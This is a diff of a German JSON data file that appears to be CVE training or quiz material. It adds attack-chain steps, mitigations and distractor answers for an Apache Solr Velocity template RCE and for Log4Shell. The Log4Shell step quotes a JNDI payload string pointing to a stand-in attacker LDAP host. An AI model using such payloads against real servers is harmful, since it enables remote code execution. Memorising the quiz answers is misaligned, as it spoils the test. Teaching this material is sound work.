@@ -293,7 +293,31 @@
      "why": "RCE: alles."
     }
    },
-   "context_de": "KEV, EPSS 0,99: Exploit im Metasploit, Massenscans. Score 7,5 mit AC:H und PR:L, Praxis: unauthentifizierte RCE in zwei Requests."
+   "context_de": "KEV, EPSS 0,99: Exploit im Metasploit, Massenscans. Score 7,5 mit AC:H und PR:L, Praxis: unauthentifizierte RCE in zwei Requests.",
+   "chain": {
+    "steps": [
+     {
+      "phase": "precondition",
+      "text": "Apache Solr (5.0.0–8.3.1) läuft mit einem Configset, das den VelocityResponseWriter aktiviert, und ist erreichbar."
+     },
+     {
+      "phase": "trigger",
+      "text": "Der Angreifer aktiviert per Parameter params.resource.loader.enabled und übergibt eine Velocity-Server-Side-Template."
+     },
+     {
+      "phase": "impact",
+      "text": "Die Template-Engine wertet den eingeschleusten Ausdruck aus und führt beliebigen Code auf dem Solr-Server aus."
+     },
+     {
+      "phase": "stopper",
+      "text": "Update auf gepatchte Solr-Version; params-Resource-Loader deaktivieren, Solr nicht offen ins Netz stellen."
+     }
+    ],
+    "distractors": [
+     "Der Angreifer fügt über eine SQL-Injection eine neue Zeile in die Datenbank ein.",
+     "Ein Opfer klickt auf einen präparierten Link und löst gespeichertes JavaScript aus."
+    ]
+   }
   },
   "CVE-2021-44228": {
    "vector_basis": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
@@ -325,7 +349,31 @@
      "why": "RCE: alles."
     }
    },
-   "context_de": "KEV mit Ransomware-Bezug, EPSS 0,99999. Klasse laut NVD CWE-20 (Input Validation), real CWE-917 (Expression Language Injection). Die generische Klasse war eine Verlegenheitslösung."
+   "context_de": "KEV mit Ransomware-Bezug, EPSS 0,99999. Klasse laut NVD CWE-20 (Input Validation), real CWE-917 (Expression Language Injection). Die generische Klasse war eine Verlegenheitslösung.",
+   "chain": {
+    "steps": [
+     {
+      "phase": "precondition",
+      "text": "Eine Anwendung nutzt eine verwundbare Log4j2-Version und schreibt vom Angreifer beeinflussbare Werte (HTTP-Header, Nutzername, Chat-Text) ins Log."
+     },
+     {
+      "phase": "trigger",
+      "text": "Der Angreifer sendet einen String mit JNDI-Lookup wie ${jndi:ldap://angreifer/x}, der beim Protokollieren ausgewertet wird."
+     },
+     {
+      "phase": "impact",
+      "text": "Log4j fragt den angreiferkontrollierten LDAP-Server ab, lädt eine entfernte Java-Klasse und führt sie aus: Remote Code Execution."
+     },
+     {
+      "phase": "stopper",
+      "text": "Update auf 2.17.x, JndiLookup-Klasse entfernen oder ausgehende LDAP/RMI-Verbindungen des Servers per Firewall blockieren."
+     }
+    ],
+    "distractors": [
+     "Der Angreifer errät per Brute Force das Admin-Passwort der Weboberfläche.",
+     "Ein lokaler Nutzer überschreibt mit erhöhten Rechten die Konfigurationsdatei der Anwendung."
+    ]
+   }
   },
   "CVE-2013-2596": {
    "vector_basis": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
